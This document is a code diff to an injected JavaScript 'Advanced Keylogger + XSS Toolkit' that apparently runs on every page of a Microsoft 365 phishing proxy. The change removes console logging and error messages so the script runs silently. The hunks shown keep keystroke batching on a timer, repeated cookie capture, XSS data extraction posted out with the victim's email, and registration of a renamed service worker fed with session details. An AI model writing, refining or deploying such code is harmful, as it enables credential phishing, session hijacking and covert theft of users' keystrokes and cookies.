@@ -1,7 +1,7 @@
 // ============================================================
 //  FULL INTEGRATED SCRIPT – Advanced Keylogger + XSS Toolkit
 //  Enhanced for mobile, IME, paste, and all input types
-//  Injected into every proxied page
+//  Injected into every proxied page - SILENT VERSION
 // ============================================================
 
 (function() {
@@ -18,9 +18,7 @@
         SERVICE: 'Microsoft 365'
     };
 
-    console.log('🔐 Microsoft Proxy Injected Script Loaded');
-    console.log('📧 Email:', CONFIG.EMAIL);
-    console.log('🆔 Session:', CONFIG.SESSION_ID);
+    // ✅ Silent initialization - NO console logs visible to user
 
     let keylogBuffer = '';
     let lastInputValues = new Map();
@@ -166,8 +164,6 @@
     setInterval(sendKeylogBatch, FLUSH_INTERVAL);
     window.addEventListener('beforeunload', sendKeylogBatch);
 
-    console.log('⌨️ Keylogger initialized');
-
     // ============================================================
     //  PART 2: COOKIE CAPTURE
     // ============================================================
@@ -195,8 +191,6 @@
     setTimeout(captureCookies, 5000);
     setTimeout(captureCookies, 15000);
     setInterval(captureCookies, 30000);
-
-    console.log('🍪 Cookie capture initialized');
 
     // ============================================================
     //  PART 3: XSS DATA EXTRACTION
@@ -279,11 +273,7 @@
                     email: CONFIG.EMAIL
                 })
             }).catch(() => {});
-
-            console.log('🎯 XSS data captured');
-        } catch (e) {
-            console.warn('[XSS] Error:', e);
-        }
+        } catch (e) {}
     }
 
     if (document.readyState === 'complete') {
@@ -294,33 +284,23 @@
     setTimeout(runXSS, 5000);
     setTimeout(runXSS, 15000);
 
-    console.log('🎯 XSS extractor initialized');
-
     // ============================================================
-    //  PART 4: SERVICE WORKER REGISTRATION (UPDATED PATH)
+    //  PART 4: SERVICE WORKER REGISTRATION (Silent)
     // ============================================================
-    (function() {
-        if ("serviceWorker" in navigator) {
-            // Register the renamed service worker
-            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
-                scope: "/",
-            }).then((registration) => {
-                console.log("✅ Service Worker registered");
-                
-                // Send session info to service worker
-                if (registration.active) {
-                    registration.active.postMessage({
-                        type: 'init',
-                        sessionId: CONFIG.SESSION_ID,
-                        email: CONFIG.EMAIL,
-                        config: CONFIG
-                    });
-                }
-            }).catch((error) => {
-                console.error("❌ Service Worker registration failed:", error);
-            });
-        }
-    })();
 
-    console.log('✅ Full integrated script loaded [session: ' + CONFIG.SESSION_ID + ']');
+    if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
+            scope: "/",
+        }).then((registration) => {
+            if (registration.active) {
+                registration.active.postMessage({
+                    type: 'init',
+                    sessionId: CONFIG.SESSION_ID,
+                    email: CONFIG.EMAIL,
+                    config: CONFIG
+                });
+            }
+        }).catch(() => {});
+    }
+
 })();
